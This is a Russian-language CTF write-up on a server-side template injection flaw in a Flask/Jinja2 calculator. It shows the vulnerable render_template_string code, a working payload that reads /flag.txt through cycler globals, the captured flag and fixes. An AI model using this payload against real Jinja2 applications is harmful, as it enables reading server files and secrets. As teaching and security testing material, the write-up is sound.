# 🧮 Challenge: Калькулятор выражений. Он безопасный?

- **Категория:** Web
- **Целевой URL:** `http://159.194.244.226:8082/`
- **Вердикт безопасности:** **НЕТ, ОН НЕ БЕЗОПАСНЫЙ (КРИТИЧЕСКАЯ УЯЗВИМОСТЬ)**
- **Флаг:** `kubstu{cl34rl1n3_t3mpl4t3_1nj3ct_983a0807}`

---

## 1. Анализ архитектуры и реализации

Приложение представляет собой веб-калькулятор **CLEARLINE 2.4.1** на базе стека:
- Python 3.12 + Flask
- WSGI-сервер Gunicorn (с балансировкой нагрузки / sticky sessions)
- Шаблонизатор Jinja2

### Разработчик реализовал строгую защиту на уровне математического движка:
1. **Белый список AST:** Парсинг через `ast.parse(expr, mode="eval")`, разрешены только числовые константы (`ast.Constant`), унарные знаки (`+`, `-`) и базовые бинарные операторы (`+`, `-`, `*`, `/`, `//`, `%`, `**`).
2. **Ограничение сложности:** Степень ограничена $|n| \le 64$.
3. **Защита от переполнения:** Числа ограничены 4096 битами (`MAX_INT_BITS = 4096`).
4. **Защита от деления на 0:** `ZeroDivisionError` перехватывается.

---

## 2. Обнаруженная уязвимость: Server-Side Template Injection (SSTI)

Несмотря на строгую валидацию в `evaluate(expr)`, в слое представления допущена критическая уязвимость инъекции шаблона.

### Исходный код (`app.py`):
```python
# The result row echoes the submitted expression. It is spliced into the
# template SOURCE before compilation instead of being passed as a variable,
# so whatever the field contains becomes part of the template itself.
RESULT_TMPL = '{% extends "result.html" %}\n{% block expression %}__EXPR__{% endblock %}'

@app.route("/")
def console():
    ...
    expr = request.args.get("expr", "")
    try:
        result = format_value(evaluate(expr))
    except ExprError as exc:
        error = translate(current_lang(), exc.key)

    ctx = {"expr": expr, "result": result, "error": error, "elapsed": elapsed}
    if len(expr) > MAX_EXPR_LEN:
        return render_template("result.html", **ctx)

    # УЯЗВИМОСТЬ: Прямая подстановка непроверенного пользовательского ввода в исходный код шаблона:
    src = RESULT_TMPL.replace("__EXPR__", expr)
    try:
        return render_template_string(src, **ctx)
    except Exception:
        return render_template("result.html", **ctx)
```

Даже если выражение выбрасывает ошибку парсинга (`ExprError: "err_not_numeric"`), выполнение не прерывается: переменная `expr` подставляется через строковую замену в строку шаблона и передается в `render_template_string(src, **ctx)`.

В результате шаблонизатор Jinja2 исполняет любые теги шаблона `{{ ... }}`.

---

## 3. Подтверждение и извлечение данных

1. Тест арифметического вычисления в шаблоне:
   `/?expr={{7*7}}` отображает `49` в блоке `<dd class="rrow__mono rrow__expr">49</dd>`.
2. Доступ к контексту через глобальные объекты Jinja2 (`cycler`):
   `{{cycler.__init__.__globals__.__builtins__.open('/flag.txt').read()}}`
3. Полученный флаг:
   `kubstu{cl34rl1n3_t3mpl4t3_1nj3ct_983a0807}`

---

## 4. Рекомендации по исправлению (Remediation)

1. **Никогда не подставлять пользовательский ввод в исходный код шаблона**:
   Вместо динамического конструирования `render_template_string(src, **ctx)` использовать стандартный статический шаблон:
   ```python
   return render_template("result.html", **ctx)
   ```
2. **Передавать входные данные строго через контекст переменных**:
   Внутри `result.html` выводить выражение как безопасную экранированную переменную:
   ```html
   {{ expr }}
   ```
3. **Прерывать выполнение при ошибке валидации**:
   Если `evaluate(expr)` падает с `ExprError`, не нужно продолжать рендеринг кастомных блоков.
